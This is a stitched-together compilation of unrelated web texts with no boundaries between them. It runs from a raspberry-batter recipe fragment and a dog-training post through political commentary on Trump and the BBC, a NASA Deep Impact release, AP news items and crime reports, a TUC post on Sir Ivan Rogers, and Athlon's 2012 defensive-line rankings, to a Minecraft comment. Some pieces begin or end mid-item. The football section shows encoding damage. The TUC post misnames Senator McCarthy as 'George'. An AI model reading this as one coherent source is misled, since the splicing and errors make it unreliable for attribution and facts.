In a large bowl, combine flour, sugar, baking soda, baking powder, and salt. Combine sour cream, butter or margarine, 1 teaspoon vanilla, and egg, and add to flour mixture. Stir just until moist. Spoon 2/3 of the batter into the prepared pan. Spread raspberry mixture evenly over the batter. Spoon remaining batter over raspberry mixture. Top with almonds.

Long ago, in the middle ages, owning a pet would be a status symbol. I do remember studying somewhere that during the medieval times, ladies of high stature would fancy keeping a little lap dog and take him around wherever they go.
Today, a lot of things have changed in the world, however, one thing that remains unchanged is the fact. That people still love to own pets as they help in recognizing them as better off than others. Well yes, I do snob a little bit because I like any other pet owner, have the joy of being able to share my life and its happiness with a companion that offers undying friendship and fierce loyalties.
The Downsides of Owning a Pet
Although, if you ask me, there are none at all, but however, for the benefit of people who have just bought a puppy, here's a list that might seem to be the downsides of having a pet.
Its bladder is troubling your home's odour You have to wake up early on weekends Go for your dog walk even when you are injured or unwell Reduce your outings or risk leaving your pet alone at home
The solution
The ultimate solution to any of these problems is dog training. Whenever you are planning to buy your puppy, it is best to conduct some research beforehand. One thing that you have to be careful about is the fact that dogs are living beings with varying moods and temperaments.
How to undertake pet dog training
There are many nuances t training your puppy into a smart and healthy dog however, the most important things are:
Objective
The first and foremost thing that one should think about is the objective of training the dog. You must remember that you do not want to instil fear in the mind of your dog but you want him to understand if he has done something that displeases you.
Dogs are very sentimental this is why if you keep on getting angry and scolding him and reduce to physical punishments; your dog will always be scared of you and might also sink into depression resulting in serious mental health issues.
Rewards
Rewards are the fastest and easiest way to carry out pet Dog Training. However ensure that you reward them the instant they do something good.
Punishments
The harshest punishments that you can give your pet are to give a tug at its collar. Beating or thrashing is going to results terribly as your dog will slowly sink into depression and never find out what upsets you. It is better to teach him the word NO and reinforce its use every time you don't want it to do anything unpleasant.
Professional training
If you are a new dog owner it is best to get professional dog training in Ahmedabad. That way you do not have to worry about raising confusion in the mind of the puppies. You can easily find dog training services in Ahmedabad. You can use the help of any popular search engine to locate a good dog kennel in Bopal and contact them for their training services.

Shipping Update July/August Jul 8, 2018 Thanks for taking a minute to read about our latest progress and developments.

State of the Hopper May 1, 2018 Hello Hoppers! It's been without a doubt a tumultuous 6 months. As you all know, over this period we've had to delay our operations due to issues arising with our previous manufacturer. This has angered a fragment of our new/existing user base because we've been unable to fulfill both new orders and RMA's in a timely manner, and for that, we're truly sorry. Nonetheless, we're continuing an ongoing effort to share what has transpired and where we are headed next.
Donald Trump does not understand some words have meanings beyond the definition in the dictionary. As an English teacher myself, I feel it is my duty to help him understand why he is wrong (at least when it comes to this). See, Trump doesn't seem to believe that calling a leader strong is anything other than a remark on that leader's grip over his people and the problems that arise.
Today's lesson is all about denotation and connotation. Denotation refers to the actual, dictionary definition of a word. A word like “strong” means
having the power to move heavy weights or perform other physically demanding tasks
able to perform a specified action well and powerfully
possessing skills and qualities that create a likelihood of success
These are all definitions that, yes, can apply to Vladimir Putin and the Chinese government. In a very literal sense, yes, you can say that both of these forces of global politics are “strong” in this sense. But, what The Donald doesn't understand is the connotation, or the common interpretation, of the term strong.
When you call someone “strong,” with no condemnation of how they use their strength, it is not seen as negative. It is seen as a statement of admiration. Trump saying it is not seen as “Damnit, Putin is strong.” It's seen as “Wow! Putin is strong!”
And admiration of the strength that reduces freedoms and rights, invades other countries, and attempts to bring his country back to USSR-like boundaries is not a quality you want in a United States leader. Given his own tendencies to advocate for violence at his rallies, saying he himself would punch a protester in the face, it does lead one to wonder if he wouldn't strive for such strength himself.
Yes, strong isn't inherently a term of admiration. But it is definitely construed as admiration for what Putin does. It is construed as admiration for the Chinese government for putting down a “riot” (Note: Mr. Trump, Tiananmen Square wasn't a “riot,” as you seem to believe).
THE BBC won't miss the irony of the SNP, its main critic, complaining about exclusion from its programme output. British bias, is it? But you still want your place on Question Time…
It shows both how sensitive the politicians are to the power of television over the bulk of consumers and how the corporation maintains its special status in the life of the (British) nation. Digital media may sprout, satellites beam and public halls resound, but if you want maximum impact on voters, you need just 45 minutes on Question Time.
So if the BBC has a public duty to reflect opinion, is it failing to do so by omitting the SNP from not one, but two, scheduled shows since the election? (John Swinney was on the Friday, May 8 special programme.)
Clearly, the answer is yes. You cannot read an analysis from The Spectator to The Guardian, from The Huffington Post to The New York Times, never mind the Scottish media, without hearing the relentless refrain that SNP success destroyed Labour and LibDem hopes and turned the UK into a two-tone country, in which Labour may never recover.
But not on the Question Time production team, where the handbags-at-dawn scuffle to lead eight LibDems is given priority, along with the mandatory “business person” and commentator.
Indeed, the notably unsuccessful Ukip, whom the BBC did much to get elected in the Euro elections, is still a more important story to David Dimbleby's team.
This week's programme came from Derby, with not a Scot in sight. Even Bonnie Prince Charlie made it that far. This is no longer a metropolitan programme in the classic BBC London sense – it is an independent production based in Glasgow.
Yet the status of the third-largest Westminster party, by some measure, hasn't moved the producers to consider the nationalists interesting enough for more exposure to the British people. There are plenty of expert MPs among them to choose from. Perhaps they're afraid of an English peasant revolt.
Or is the BBC's issue that the Scots are the primitives agitating for access to hallowed ground that belongs to the chosen few – those who inhabit the nomenclature?
Just like nationalist MPs occupying places on the green benches that were customarily assigned to others, so they are now muscling in on the media where they're not wanted.
The stock answer to this is geography – we'll have you on when we're in Aberdeen. In other words, we don't want you on the box but in your box.
Let's recall some findings from the King Report on BBC news network bias.
The UK and England are often used interchangeably, it said. Presenters, when talking about England, say “we”, “us” and “this country”. Politics across the four nations is often seen through Westminster eyes. Hardly any legislators in Scotland, Wales or Northern Ireland are interviewed on network news.
That was seven years ago. Scotland has embraced the SNP full-on since then, the UK just survived a referendum and now Britain too has changed in ways the public are struggling to comprehend and are looking to the broadcasters to explain. Is it too much to expect the BBC to catch up any time soon?

NASA's Deep Impact Films Earth as an Alien World

ChandlerMassachusetts Institute of Technology, Cambridge, Mass.617 253-2704COLLEGE PARK, Md. -- NASA's Deep Impact spacecraft has created a video of the moon transiting (passing in front of) Earth as seen from the spacecraft's point of view 31 million miles away. Scientists are using the video to develop techniques to study alien worlds."Making a video of Earth from so far away helps the search for other life-bearing planets in the Universe by giving insights into how a distant, Earth-like alien world would appear to us," said University of Maryland astronomer Michael A'Hearn, principal investigator for the Deep Impact extended mission, called EPOXI.Deep Impact made history when the mission team directed an impactor from the spacecraft into comet Tempel 1 on July 4, 2005. NASA recently extended the mission, redirecting the spacecraft for a flyby of comet Hartley 2 on Nov. 4, 2010.EPOXI is a combination of the names for the two extended mission components: a search for alien (extrasolar) planets during the cruise to Hartley 2, called Extrasolar Planet Observations and Characterization (EPOCh), and the flyby of comet Hartley 2, called the Deep Impact eXtended Investigation (DIXI).During a full Earth rotation, images obtained by Deep Impact at a 15-minute cadence have been combined to make a color video. During the video, the moon enters the frame (because of its orbital motion) and transits Earth, then leaves the frame. Other spacecraft have imaged Earth and the moon from space, but Deep Impact is the first to show a transit of Earth with enough detail to see large craters on the moon and oceans and continents on Earth."To image Earth in a similar fashion, an alien civilization would need technology far beyond what Earthlings can even dream of building," said Sara Seager, a planetary theorist at the Massachusetts Institute of Technology, Cambridge, Mass., and a co-investigator on EPOXI. "Nevertheless, planet-characterizing space telescopes under study by NASA would be able to observe an Earth twin as a single point of light -- a point whose total brightness changes with time as different land masses and oceans rotate in and out of view. The video will help us connect a varying point of planetary light with underlying oceans, continents, and clouds -- and finding oceans on extrasolar planets means identifying potentially habitable worlds." said Seager."Our video shows some specific features that are important for observations of Earth-like planets orbiting other stars," said Drake Deming of NASA's Goddard Space Flight Center in Greenbelt, Md. Deming is deputy principal investigator for EPOXI, and leads the EPOCh observations. "A 'sun glint' can be seen in the movie, caused by light reflected from Earth's oceans, and similar glints to be observed from extrasolar planets could indicate alien oceans. Also, we used infrared light instead of the normal red light to make the color composite images, and that makes the land masses much more visible." That happens because plants reflect more strongly in the near-infrared, Deming explained. Hence the video illustrates the potential for detecting vegetated land masses on extrasolar planets by looking for variations in the intensity of their near-infrared light as the planet rotates.The University of Maryland is the Principal Investigator institution, leading the overall EPOXI mission, including the flyby of comet Hartley 2. NASA Goddard leads the extrasolar planet observations. NASA's Jet Propulsion Laboratory, Pasadena, Calif., manages EPOXI for NASA's Science Mission Directorate, Washington. The spacecraft was built for NASA by Ball Aerospace & Technologies Corp., Boulder, Colo.Please note that these images appear at the largest possible resolution, having been taken from 31 million miles away and cropped from a much larger photograph:Videos without globe graphic:

OLYMPIA, Wash. (AP) - More than 2,400 gay and lesbian couples have gotten married in Washington state since the state's voter-approved same-sex marriage law took effect last December, according to numbers released Thursday by the state.
The data released by the state Department of Health covers same-sex marriages from when licenses first were issued in early December until the end of March. Individual counties had released same-sex marriage numbers previously, but the Department of Health's numbers are the first statewide look at how many people took advantage of the new law.
According to the Department of Health:
Same-sex marriages occurred in 35 of the state 39 counties during the December-end of March timeframe.
Same-sex marriages represented more than 20 percent of the 11,661 marriages that took place during that same period of time.
King County had the highest number of same-sex marriages, with 1,321.
63 percent of same-sex marriages were female couples.
14 percent of the weddings were for couples who had traveled to Washington state from other states.
Three counties have reported no same-sex marriages through June: Ferry, Garfield and Wahkiakum. Asotin was also listed by Department of Health as having no same-sex marriages during the December-March time frame, but the auditor's office said Thursday they've had a total of 9 same-sex marriages since December.
Washington state is one of 12 states, plus Washington, D.C., where same-sex marriage is legal. Minnesota is the most recent state to allow same-sex couples to marry after Gov. Mark Dayton signed legislation into law May 14, and couples there started picking up their marriage licenses on Thursday.
In November, nearly 54 percent of voters in Washington state approved a referendum that had asked them to either approve or reject the state law legalizing same-sex marriage that lawmakers passed earlier in the year.
The law took effect on Dec. 6, when hundreds of gay and lesbian couples picked up their marriage licenses. But because of the state's three-day waiting period, the earliest weddings started taking place was on Dec. 9. Numerous weddings took place across the state, both private and public, with the largest event hosted by Seattle City Hall, where more than 130 couples took part.
After all marriages, counties send marriage certificates to the state Department of Health. Spokesman Tim Church said that March is the most recent month the state has complete numbers for because it takes some time for the certificates to get from the counties and entered into the system. Church said that future reports will be released annually.
× Republican Senate hopeful uses journalist execution video in campaign ad
WASHINGTON — The masked man appears briefly, for only a frame or two, but it's startling nonetheless.
The not-yet-identified killer of kidnapped American photographer James Foley is featured in an ominous and risky campaign ad released Monday by New Mexico's Republican nominee for Senate, Allen Weh, the underdog challenger to first-term Democratic Senator Tom Udall.
Weh, a Marine combat veteran and onetime New Mexico Republican Party Chairman, appears to be the first candidate this cycle to use Foley's gruesome execution as campaign fodder, portraying the murder as one consequence of a rudderless American foreign policy mismanaged by President Obama and Udall.
Foley himself is cropped out of the web video, leaving only the stark image of the black-clad jihadist, clutching a blade in the Syrian desert.
That picture is on screen for barely two seconds second and then fades quickly into a cascade of dark Middle East scenery — including ISIS militants in Iraq and the bombing of mosques — all of it intercut with video of Obama playing golf and vacationing on Martha's Vineyard.
“To change Washington, you must change your Senator,” reads a banner at the conclusion of the ad, titled “Restore Leadership.”
Udall leads Weh by double digits in recent polling and is considered safe in his re-election bid with just over two months until Election Day.
Despite its former swing state status and a Republican governor in office, New Mexico has drifted Democratic in federal elections over the last decade, thanks in part to its growing Hispanic population.
WASHINGTON (AP)  The United States on Friday made an emergency contribution of more than $20 million for urgent relief efforts in the Gaza Strip, a day after the United Nations launched a flash appeal for $613 million to help Palestinians recover from Israel's three-week military operation there. The State Department said President Obama had authorized the use of $20.3 million from the U.S. Emergency Refugee and Migration Assistance Fund for humanitarian assistance to the 1.4 million Palestinians in Gaza. The money will go to U.N. agencies and the International Committee of the Red Cross, which are distributing emergency food assistance, providing medical care and temporary shelter, creating temporary employment and restoring access to electricity and potable water, the department said in a statement. The Israeli offensive killed nearly 1,300 Palestinians, including hundreds of civilians, and caused an estimated $2 billion in damage, Palestinian officials say. The assault was launched to halt years of Hamas rocket fire on southern Israel. Copyright 2009 The Associated Press. All rights reserved.

In a whopping 80-page report from Morgan Stanley this morning, analyst Richard Berner takes on America's problems with unemployment head on, addressing both long-term and short-term solutions that could help get people back into work. Many points were made, but one that stuck out was the subject of "labor immobility resulting from the housing bust."
Essentially, since people are stuck in their homes for one reason or another, it's becoming much harder for people to find work outside of their hometown since they can't sell their house.
Morgan Stanley: America's workers have always been footloose. Even in the Great Depression, they looked for work wherever it was. Today, however, about one in four homeowners is trapped in their house because they owe more than the house is worth, so they can't move to take another job — until they sell or walk away. Unlike in the Depression, when homeownership was less prevalent, negative equity among a nation of homeowners leads to substantially lower mobility rates. That is leading to a wave of "strategic defaults" in which borrowers who can otherwise afford to pay decide to walk away. Whether through foreclosure or default, this process is undermining the economic and social fabric of communities and reducing job opportunities. Long-term solutions: Financial and mortgage regulatory reform are essential to restore the health of housing finance. Significantly improving financial literacy is equally important. Short-term remedies: Local efforts to stabilize communities plagued by foreclosure are essential, but they are not enough. It is essential to reduce debt, writing off bad loans while not destabilizing the financial system. Modifying existing mortgages seems appealing, but policies aimed at mitigating foreclosures under the Home Affordable Modification Program (HAMP) have not worked because they modify mortgage payments and not the amount of debt owed; re-default rates following modification are 50-60%. Efforts to establish a protocol for short sales and/or principal reduction should be a useful tool in avoiding costly foreclosure and strategic default.
EUSTIS � A homeless man was jailed Wednesday after reportedly urinating on the floor at the Eustis Police Department and ordering officers to clean it up.
According to an arrest affidavit, Eustis police were called to the area of County Road 452 and Yale Retreat Road at about 3:15 p.m. Wednesday to reports of an older man stumbling in the road.
When police confronted the man � who was eventually identified as 52-year-old Phillip Wayne Smith � he refused to give his name as he proceeded to curse at officers.
According to the affidavit, Smith smelled of alcohol, and he was arrested for disorderly intoxication.
When placed in the booking room, Smith said he had to use the bathroom, so officers unlocked his handcuffs. He then reportedly unzipped his pants, urinated on the floor and ordered officers to clean it up.
Smith remained in the Lake County Jail on Thursday in lieu of a $500 bond.
Three key messages from Sir Ivan Rogers' resignation
04 Jan 2017, by Owen Tudor in International
The headlines yesterday and today focus on “muddled thinking” as the key phrase to stand out from the leaked resignation e-mail of the civil service's top man in Brussels, Sir Ivan Rogers. But in fact, that's only the third most important part of the story around the shock departure of the UK Permanent Representative (Ambassador) to the European Union.
Much more important are his revelation that, still, there is no plan, and secondly, the reaction of Brexiteers to his departure. These have ranged from the McCarthyite witch-hunt being promoted by Nigel Farage and other bullies, to the less offensive but – because it's more likely to happen – more worrying argument that the UK will negotiate more successfully if its chief negotiator tells Ministers what they want to hear rather than what they need to know.
“I hope you will continue to challenge ill-founded arguments and muddled thinking and that you will never be afraid to speak the truth to those in power. “I hope that you will support each other in those difficult moments where you have to deliver messages that are disagreeable to those who need to hear them. “I hope that you will continue to be interested in the views of others, even where you disagree with them, and in understanding why others act and think in the way that they do. “I hope that you will always provide the best advice and counsel you can to the politicians that our people have elected, and be proud of the essential role we play in the service of a great democracy.”
Sir Ivan has been part of the senior reaches of the British civil service (in the Treasury, No 10 and now the Foreign and Commonwealth Office) for over a decade. So it's no surprise that the final part of his valedictory email to the staff at the UK's embassy to the EU (known as UKREP – Brussels does like an acronym) contained what certainly used to be pretty much standard advice from the old hands to their successors. It does sound a bit Yes Minister, but senior civil servants regularly consider politicians to have ‘muddled thinking' that needs to be straightened out by the career experts. When I learnt about constitutional process, it was commonly understood that civil servants were partly there to save politicians from themselves by reminding them of uncomfortable realities. Obviously politicians don't like this (especially those newly empowered and emboldened by electoral victory), and suspect that they are being played by people with their own agenda (and sometimes that's true), but it's nevertheless a vital part of the informal system of checks and balances in the British constitution.
It is more worrying that people found these words remarkable than that it should have been in the email, unless there are still people naïve enough to think that politicians can sometimes be muddled or wrong!
That's the second most worrying aspect of this affair – the reaction to it by those who support Brexit. Nigel Farage didn't quite claim that he had the names of 205 Remainers in the FCO in his briefcase, as red-baiter George McCarthy said of communists in the US state department in 1950, but he came awfully close. Several politicians – including some who ought to know better – seem to be arguing that those people who may privately share the view expressed by 48% of the electorate last June should be rooted out of positions of influence. All witch-hunts are dangerous, but ones directed at such a large proportion of the population are especially worrying. But these views are relatively easy to rebut.
What is more likely, and therefore even more problematic, is the view being expressed by more powerful voices that Sir Ivan's successor (and Shan Morgan's successor as his Deputy, as she is already off to run the Welsh government's civil service) should be selected on the basis not of competence alone, but on the basis of their political views. The independence of the civil service is one of its greatest strengths, and the experience of Special Advisers over the last couple of decades shows how (whilst they perform a useful function) perilous the spread of political appointments can be. Politicians decide, civil servants advise. That's not to say they should not be committed to implementing political decisions (Rogers' memo makes that clear), it's about having people in key positions whose job it is to make sure the politicians making those decisions are fully informed.
As Sir Ivan's email said, this involves speaking truth to those in power, and the danger of a system where the advisers are so committed that they ignore all the problems ahead is that those problems are real and could cause enormous problems. To take just one example, sail into the negotiations blissfully unaware that the rest of the EU is going to insist on certain red lines (just as the British government will have red lines) would be like sailing into a harbour unaware of the rocks under the water. You're not likely to reach your intended destination.
“We do not yet know what the government will set as negotiating objectives for the UK's relationship with the EU after exit.”
But the absolute killer in the email is, of course, the confirmation (some say it is a revelation – although it's been revealed in various forms over the last few months, not least the Deloitte memo) that the British government still does not have a plan for what it wants out of Brexit or how it is going to get it. All of us involved in this work outside of the government often suffer from the nagging worry that there is a plan which is being kept from us. But if it's been kept from the government's chief negotiator in Brussels, then it's pretty clear that it really does not yet exist. And we are, remember, less than 90 days away from the Prime Minister's self-imposed deadline for the triggering of Article 50.
So, as well as a new UK Permanent Representative in Brussels (and a new Deputy), the Prime Minister needs a plan, and fast. The TUC has been calling for this since last summer, and we have also been calling for the government not to keep it secret, but share it with the UK electorate and the key stakeholders – unions and business, city mayors and devolved administrations – so that it represents a common consensus that we can present to the rest of the EU.
Time, as well as people, are running out.

A California college student wielding a knife went on a rampage at the University of California's Merced campus Wednesday, stabbing four people before he was shot dead by police, authorities said.
The violence broke out during an 8 a.m. class in a second-floor classroom of the school's Classroom and Office Building. The suspect was taken down within 20 minutes, the school said, and all those stabbed are expected to recover.
The attacker stabbed a student inside the classroom and then stabbed a contract worker who heard the sound of a struggle and came to investigate, officials said.
"We thought it was a fight going on and we heard people screaming," Jacob Rodriguez, who was painting a wall with the worker who was stabbed, told NBC News.
"My co-worker opened the door to see if there was a fight going on and if they needed help. He said the teacher looked at him and said ‘no,' and then the guy ran out and attacked my co-worker,” Rodriguez said.
"He attacked my co-worker and then he came towards me and I grabbed a ladder and put a ladder between me and the guy and he ran off downstairs," Rodriguez said.
Police said the suspect ran from the classroom and down a flight of stairs and stabbed a second student and a student adviser before he was spotted by officers.
"When the suspect turned toward the officers, an officer-involved shooting occurred and the suspect succumbed to his injuries," UC Merced Police Chief Albert Vasquez said.
The suspect's name was not released pending notification of next of kin. He was described as a “young adult” who was a California resident but was living on campus.
The university first reported that five people were stabbed, but later corrected that number to four. “Their injuries, thank God, appear not to be life threatening,” UC Merced Chancellor Dorothy Leland said.
A motive in the rampage was not released. Authorities called in a bomb squad to examine the attacker's backpack as a precaution, officials said.
The worker who went inside the classroom was being called a hero for interrupting the attack on the student.
For 40 years a serial murder case has haunted Houstonians, but now we're hearing from a would-be victim whose survival story has haunted him his whole life.
To this day, there are still unidentified and even unknown victims of serial killer Dean Corll and his two counterparts.
"Dad has so many pictures," Bret Ashworth said.
Ashworth's memory of that day is hidden as deep as his father's old pictures from that era. But he's digging it up 41 years later.
"This is what I looked like in 1971. There I am, right there. That's when it happened, that's when I'm 11," Ashworth said.
It was a time in Houston when dozens of young boys were disappearing. Surprisingly, no one really noticed until at least 29 of them turned up dead at the hands of a single serial killer.
"Nobody had any idea, and I didn't know until I saw it on the news," Ashworth said.
But around that time, 11-year-old Ashworth was hitchhiking to a friend's house when a white van stopped to pick him up.
"I basically started to get in the van and what kept me from going in the van was I heard a mumbling sound and I was like, 'This isn't supposed to sound like this.' So I said, 'No man, it's all right,'" he said.
The driver, one of that serial killer's accomplices, wouldn't let him go, and Ashworth fought back.
"He grabbed my right hand, he tried to jerk me in the van and when he did -- I'm left handed -- and I always carried a knife," Ashworth said. "So when he had me by the hand, I was able to hit him with that and that's when he just went 'Ahh!' and he let go."
Back in 1971 when it happened on the streets of The Heights, Ashworth didn't really tell anyone about it -- not his parents or police. But the day a few years later that Elmer Wayne Henley was caught and he confessed, that's when Ashworth saw the one clue that helped him put all the pieces together.
"It was Wayne Henley who grabbed me," Ashworth said.
"You sure of that?" we asked.
"I'm positive. You can look at the scar on his hand today," he said.
"How can you be so positive?" we asked.
"That I know it was him? 'Cause I looked him right in the eye when he pulled me," Ashworth said. "And I saw him in handcuffs ... and I looked down and I said what the hell and I opened the picture further and saw his face and went oh my God. And I said no, that couldn't be him, and I looked at his hand and you could see the scar."
And so can we, faintly in old film but it's there. It's proof that at least someone got away from Elmer Wayne Henley, proof that the little boy in that old photograph grew up to be a man who could tell the story.
"I have a feeling he killed about 50 children. There was no remorse in this guy's eyes. He wanted to grab me and he didn't care how he did it," Ashworth said.
Ashworth got in touch with us when he saw word of a possible new victim from the Corll killings on our newscast. We showed you the recently unearthed picture of a possible new victim. If anyone knows the identity of the boy in the picture, they should contact the Harris County Institute of Forensic Sciences at 713-796-9292.
Theyâre the teams within the team â those cohesive little units bound together by their shared responsibilities within the larger team context.
Whether itâs the offensive linemen firing off time after time into those familiar blocking sleds, or the defensive linemen drilling repeatedly on how to shed blockers, or the defensive backs breaking on ball after ball â these teams in miniature hone their tasks on the practice field until those tasks become second nature.
Whether or not these units function as one can make the difference between winning and losing, and a single unit can carry a team to New Yearâs Day â or beyond.
Itâs entirely fitting, then, for us to honor the best of the best at each position with our 12th annual Athlon Awards.
Athlon's Top 20 Defensive Lines for 2012
1. LSU â Even when the Tigers lose a standout up front, this unit never seems to miss a beat. Tackle Michael Brockers is gone, but Anthony Johnson and Ego Ferguson are ready to emerge as key performers. Bennie Logan will be the anchor in the middle and should contend for All-SEC honors in 2012. The Tigers might have the top defensive end combination in college football, as Sam Montgomery and Barkevious Mingo are back after combining for 17 sacks last year.
2. Florida State â Even though the Seminoles finished second nationally in rush defense and averaged 3.1 sacks per game last year, this unit could be better in 2012. Ends Brandon Jenkins and Bjoern Werner quietly accumulated 15 sacks last season, and that duo will be spelled by top recruit Mario Edwards Jr. The interior of the line is overflowing with depth, and sophomore Timmy Jernigan could be one of the breakout players in the ACC this season. Seniors Everett Dawkins and Anthony McCloud, along with junior Demonte McAllister will provide Jernigan with plenty of help at tackle.
3. Texas â The Longhorns finished sixth nationally in rush defense last year, and two starters return for 2012. Ends Alex Okafor and Jackson Jeffcoat combined for 14.5 sacks last season and should challenge for All-America honors in 2012. With Kheeston Randall and Calvin Howell departing, the interior will have some new faces stepping into the rotation. Ashton Dorsey recorded five tackles for a loss in 2011 and will start at one interior spot. The other spot is expected to go to sophomore Desmond Jackson, but junior college transfer Brandon Moore will push for playing time.
4. Virginia Tech â Standout defenses have been a hallmark of Frank Beamer, and the Hokies are loaded on this side of the ball for 2012. End James Gayle had a breakout season last year, recording 38 tackles and seven sacks in 14 contests. J.R. Collins was disruptive from the other end spot, collecting 57 tackles and six sacks. The Hopkins brothers, Derrick and Antoine, will start at the tackle spots, but expect to see plenty of Luther Maddy and Corey Marshall in the rotation.
5. South Carolina â Melvin Ingram wonât be easy to replace, but the Gamecocks should still have one of the SECâs top defensive lines in 2012. Jadeveon Clowney terrorized opposing quarterbacks as a freshman last year, recording 36 tackles and eight sacks. Devin Taylor had a relatively quiet 2011 season but will join Clowney as a starter at end. The interior will be anchored by promising sophomore Kelcy Quarles and senior Byron Jerideau.
6. Ohio State - 2011 was a disappointing all-around year for the Buckeyes. However, expect a quick turnaround in Columbus. New coach Urban Meyer is one of the best in college football and even with a bowl ban, should have Ohio State pushing for 10 or 11 victories. The defense was solid last season but wasnât as dominant as we have seen in recent years. With three returning starters, the line should be one of the nationâs best in 2012. End John Simon and tackle Johnathan Hankins will contend for All-American honors, while senior Garrett Goebel is a steady performer at nose guard. This group will get an infusion of depth with a stellar freshman class, namely Noah Spence and Adolphus Washington.
7. Georgia â The Bulldogs are tough to evaluate on the defensive line, as their 3-4 alignment isnât a conventional attacking unit like South Carolina or LSU. However, this group is one of the best in the SEC. Senior John Jenkins is a 358-pound immovable object on the interior. And the coaching staff can keep him fresh by rotating fellow senior Kwame Geathers into the interior. The end spots should go to seniors Cornelius Washington and Abry Jones.
8. Michigan State â Jerel Worthyâs departure is a huge blow for the Spartansâ defensive line. This unit led the Big Ten in rushing defense and recorded 44 sacks last year. Although Worthy will be missed, Michigan State returns ends William Gholston and Marcus Rush (combined for 9 sacks last season). The interior of the line will be watched closely early in the year, but Anthony Rashad White has experience, while Vanderbilt transfer James Kittredge finished spring with the edge at the other tackle spot.
9. Oregon â The Ducks have quietly transitioned into a 3-4 scheme and thereâs no shortage of talent or depth returning in 2012. End/linebacker Dion Jordan is an athletic force off the edge, recording 42 stops, 13 tackles for a loss and 7.5 sacks last year. Taylor Hart is also coming off a strong season, picking up 44 tackles and honorable mention All-Pac-12 honors. The interior of the line should be anchored by Wade Keliikipi and senior Isaac Remington but look for Jared Ebert and Ricky Heimuli to see plenty of snaps. True freshman Arik Armstead is expected to push for playing time at end this year.
10. Alabama â Just like Georgia, itâs not easy to evaluate Alabamaâs 3-4 alignment against 4-3 teams like Florida State, LSU and South Carolina. The linebackers play a key role in the rush defense, but the front trio also deserves credit for finishing No. 1 overall last season. Seniors Damion Square and Jesse Williams are back as returning starters and both should be in the mix for All-SEC honors. Ed Stinson and Quinton Dial will likely battle for the third spot on the line. Finishing No. 1 overall again in rush defense seems unlikely. However, donât expect the Crimson Tide to drop too far in the defensive statistics this year.
11. Florida â If not for two injured knees, the Gators could rank much higher on this list. Ronald Powell was poised for a huge season but suffered a torn ACL in the spring game. Dominique Easleyâs status for the opener is also up in the air, as he is also recovering from a knee injury suffered late in the 2011 season. Even with Easley and Powell questionable for the first game, Will Muschamp still has plenty to work with. Sharrif Floyd is a third-team Athlon Sports All-American for 2012, while senior Omar Hunter will man the other tackle spot. Look for true freshman Jonathan Bullard and junior college transfer Damien Jacobs to factor into the rotation.
12. Auburn â The Tigers should have one of the nationâs most improved defensive lines in 2012. All four starters are back from a unit that allowed 189.2 rushing yards per game last season, including All-American candidate Corey Lemonier. Joining Lemonier at the end spot will be junior Nosa Eguae. Juniors Jeffrey Whitaker and Kenneth Carter should start in the middle, but talented sophomores Angelo Blackson and Gabe Wright will be tough to keep off the field.
13. Utah â The nationâs No. 1 defensive tackle resides in Salt Lake City. Senior Star Lotulelei is back to anchor Utahâs defensive line, and this unit gave Pac-12 offensive fronts all it could handle last year. Lotulelei will continue to take up two blockers, opening up senior Dave Kruger to wreck havoc from the other tackle spot. Joe Kruger and Nate Fakahafua will likely start at the end spots, but thereâs very little in the way of proven depth after the top four.
14. Notre Dame â Aaron Lynch is gone, but the Fighting Irish still have plenty left in the tank to boast one of the nationâs top defensive lines. Nose guard Louis Nix III will be a difficult matchup for opposing offensive lines, while Kapron Lewis-Moore and Stephon Tuitt man the end spots. Depth is an issue, but the coaches are excited about the potential of Chase Hounshell and Sheldon Day.
15. Oklahoma â Potential is the key word surrounding the Soonersâ defensive line. Three starters are gone, but the newcomers are experienced and certainly arenât short on talent. Ends David King and R.J. Washington combined for seven sacks in limited work last year. Stacy McGee, Casey Walker and Jamarkus McFarland should be a solid trio in the middle. McFarland has yet to live up to the hype that had him ranked among the nationâs best coming out of high school.
16. Illinois â Replacing Whitney Mercilus wonât be easy, but the Fighting Illini return three starters. End Michael Buchanan recorded 7.5 sacks and 13.5 tackles last season. He will be joined on the other side by senior Justin Staples (16 tackles in 2011). The interior is in good shape, largely due to the return of Akeem Spence (69 stops last year) and senior Glenn Foster.
17. South Florida â The Bulls allowed only 107.3 rushing yards per game last season and accumulated 39 sacks. This unit should be strong once again in 2012, led by junior Ryne Giddins. He recorded 5.5 sacks and three forced fumbles on his way to earning second-team All-Big East honors. Tackle Cory Grissom suffered an ankle injury in spring practice but is on schedule to return in time for the season opener. Two spots on the line are up for grabs, but junior college recruit Tevin Mims and sophomore Elkino Watson are capable starters.
18. Nebraska â After allowing 158.5 rushing yards per game last season, Bo Pelini knows this unit has to get better if Nebraska wants to win the Big Ten. Contributing to some of the problems last season was tackle Jared Crick suffering a season-ending injury early in the year. The Cornhuskers are counting on senior Baker Steinkuhler and Chase Rome to lead the way on the interior. Steinkuhler has a lot of talent, but needs to take his game up a notch. Senior Cameron Meredith and Jason Ankrah should be steady on the outside.
19. Penn State â With the departures on offense, the Nittany Lions could be winning a lot of ugly 13-10 games this season. Tackle Devon Still will be hard to replace, but the line returns Jordan Hill to man the interior, while ends Pete Massaro and Sean Stanley should be steady. Getting pressure on opposing quarterbacks will be crucial with four new starters in the secondary.
20. NC State â The Wolfpack are a sneaky defensive line to watch in 2012. Markus Kuhn and J.R. Sweezy must be replaced in the middle, but sophomores Thomas Teal and T.Y. McGill gained valuable experienced last year. NC State has plenty of depth at end, headlined by sophomore Art Norman and junior Darryl Cato-Bishop.

I actually always was curious of how you never had to light torches in Minecraft.
Whatever.
Y'all been there: you're in a cave, exploring new (under)grounds (Khe Khe), and you run out of torches right as you enter a surprise dungeon or something.
I think that happened to PBat back in like 2011 or something.
Dark times
Get it because he ran out of torches?
Has it actually become a thing where people are reasonably embarrassed to admit they play Minecraft?
WASHINGTON — Prosecutors are extracting data from more than 100 locked cell phones seized during arrests in downtown Washington, DC, on President Trump's Inauguration Day, according to court papers prosecutors filed on Wednesday.
Prosecutors said they had search warrants to pull data from the phones, which were taken from individuals arrested on Inauguration Day, including some who were not indicted. All of the phones were locked, according to the government, "which requires more time-sensitive efforts to try to obtain the data." But the filing appeared to indicate that they were successful in accessing information on the phones.
There are 214 people facing a felony rioting charge in connection with demonstrations on Jan. 20 that turned violent and, according to prosecutors, involved more than $100,000 in property damage. A handful of defendants are also facing separate charges for destruction of property and assaulting police.
